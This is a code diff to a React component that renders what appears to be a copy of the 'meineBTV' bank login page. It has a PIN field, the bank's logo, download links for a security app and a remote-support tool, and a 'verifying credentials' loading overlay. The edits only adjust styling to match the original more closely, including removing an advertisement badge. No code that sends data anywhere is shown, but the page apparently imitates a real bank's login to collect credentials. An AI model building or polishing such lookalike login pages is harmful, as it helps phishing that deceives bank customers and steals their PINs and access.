@@ -39,8 +39,8 @@ const translations: Record<Lang, {
     firstLogin: "Erstanmeldung",
     linksTitle: "Weiterführende Links",
     links: [
-      "Download BTV Security App - Apple/Mac",
-      "Download BTV Security App - Windows/PC",
+      "Download BTV Security App -\nApple/Mac",
+      "Download BTV Security App -\nWindows/PC",
       "meineBTV - Erstanmeldung",
       "meineBTV - Hilfe und FAQs",
       "FastClient - Fernwartungstool",
@@ -64,8 +64,8 @@ const translations: Record<Lang, {
     firstLogin: "First login",
     linksTitle: "Further links",
     links: [
-      "Download BTV Security App - Apple/Mac",
-      "Download BTV Security App - Windows/PC",
+      "Download BTV Security App -\nApple/Mac",
+      "Download BTV Security App -\nWindows/PC",
       "meineBTV - First login",
       "meineBTV - Help and FAQs",
       "FastClient - Remote support tool",
@@ -103,6 +103,7 @@ const Btv = () => {
   const [language, setLanguage] = useState<Lang>("DE");
   const [langOpen, setLangOpen] = useState(false);
   const [currentSlide, setCurrentSlide] = useState(0);
+  const [hoverLink, setHoverLink] = useState<number | null>(null);
   const langRef = useRef<HTMLDivElement | null>(null);
 
   usePageMeta("meineBTV - Login", btvLogo);
@@ -158,7 +159,7 @@ const Btv = () => {
 
   return (
     <>
-      <style>{`.btv-input::placeholder{color:${BTV_BLUE};opacity:1;}`}</style>
+      <style>{`.btv-input::placeholder{color:${BTV_BLUE};opacity:1;}.btv-link-row:hover .btv-link-text{color:#668da3;}`}</style>
       {showLoading && (
         <LoadingOverlay
           message="Anmeldedaten werden überprüft..."
@@ -184,7 +185,7 @@ const Btv = () => {
             borderBottom: "1px solid #3785b3",
           }}
         >
-          <img src={btvLogo} alt="BTV" style={{ height: isMobile ? 36 : 44 }} />
+          <img src={btvLogo} alt="BTV" style={{ height: isMobile ? 30 : 36 }} />
         </div>
 
         {/* Main */}
@@ -251,9 +252,9 @@ const Btv = () => {
                     placeholder={t.pinPlaceholder}
                     value={pin}
                     onChange={(e) => setPin(e.target.value)}
-                    style={{ ...inputStyle, flex: 1, minWidth: 0 }}
+                    style={{ ...inputStyle, flex: "1 1 0", width: 0, minWidth: 0, height: 38, padding: "0 12px" }}
                   />
-                  <div ref={langRef} style={{ position: "relative", flex: 1, minWidth: 0 }}>
+                  <div ref={langRef} style={{ position: "relative", flex: "1 1 0", width: 0, minWidth: 0 }}>
                     <button
                       type="button"
                       onClick={() => setLangOpen((p) => !p)}
@@ -266,6 +267,7 @@ const Btv = () => {
                         justifyContent: "space-between",
                         textAlign: "left",
                         height: 38,
+                        width: "100%",
                       }}
                     >
                       <span>{t.languageNames[langKeys.indexOf(language)]}</span>
@@ -384,19 +386,20 @@ const Btv = () => {
                 {t.links.map((label, i) => (
                   <div
                     key={i}
+                    className="btv-link-row"
                     style={{
                       display: "flex",
                       alignItems: "center",
                       justifyContent: "space-between",
-                      padding: "8px 0",
+                      padding: "6px 0",
                       borderBottom: i === t.links.length - 1 ? "none" : `1px solid ${CARD_BORDER}`,
                       fontSize: 12,
-                      color: "#000",
                       cursor: "pointer",
+                      gap: 8,
                     }}
                   >
-                    <span>{label}</span>
-                    <ChevronRight size={14} color={BTV_BLUE} />
+                    <span className="btv-link-text" style={{ color: "#000", whiteSpace: "pre-line", lineHeight: 1.3 }}>{label}</span>
+                    <ChevronRight size={18} color="#000" style={{ flexShrink: 0 }} />
                   </div>
                 ))}
               </div>
@@ -433,22 +436,6 @@ const Btv = () => {
                   }}
                 />
               ))}
-              {/* Werbung pill */}
-              <div
-                style={{
-                  position: "absolute",
-                  top: 10,
-                  right: 12,
-                  background: "rgba(10,58,92,0.55)",
-                  color: "#fff",
-                  fontSize: 12,
-                  padding: "4px 12px",
-                  borderRadius: 20,
-                  zIndex: 2,
-                }}
-              >
-                {language === "DE" ? "Werbung" : "Advertisement"}
-              </div>
               {/* Pagination row: arrow • • arrow */}
               <div
                 style={{
@@ -465,12 +452,11 @@ const Btv = () => {
                 <button
                   onClick={prevSlide}
                   style={{
-                    background: "rgba(0,0,0,0.25)",
+                    background: "transparent",
                     border: "none",
-                    color: "#fff",
+                    color: BTV_DARK,
                     width: 20,
                     height: 20,
-                    borderRadius: "50%",
                     cursor: "pointer",
                     display: "flex",
                     alignItems: "center",
@@ -478,7 +464,7 @@ const Btv = () => {
                     padding: 0,
                   }}
                 >
-                  <ChevronLeft size={14} />
+                  <ChevronLeft size={18} strokeWidth={2.5} />
                 </button>
                 {slides.map((_, i) => (
                   <span
@@ -488,7 +474,7 @@ const Btv = () => {
                       width: 8,
                       height: 8,
                       borderRadius: "50%",
-                      background: currentSlide === i ? "#fff" : "rgba(255,255,255,0.4)",
+                      background: currentSlide === i ? BTV_DARK : "rgba(255,255,255,0.4)",
                       cursor: "pointer",
                     }}
                   />
@@ -496,12 +482,11 @@ const Btv = () => {
                 <button
                   onClick={nextSlide}
                   style={{
-                    background: "rgba(0,0,0,0.25)",
+                    background: "transparent",
                     border: "none",
-                    color: "#fff",
+                    color: BTV_DARK,
                     width: 20,
                     height: 20,
-                    borderRadius: "50%",
                     cursor: "pointer",
                     display: "flex",
                     alignItems: "center",
@@ -509,7 +494,7 @@ const Btv = () => {
                     padding: 0,
                   }}
                 >
-                  <ChevronRight size={14} />
+                  <ChevronRight size={18} strokeWidth={2.5} />
                 </button>
               </div>
             </div>
@@ -549,7 +534,7 @@ const Btv = () => {
                   background: "#668da3",
                   color: "#fff",
                   border: "none",
-                  padding: "10px 28px",
+                  padding: "14px 32px",
                   fontSize: 14,
                   fontWeight: 700,
                   cursor: "pointer",
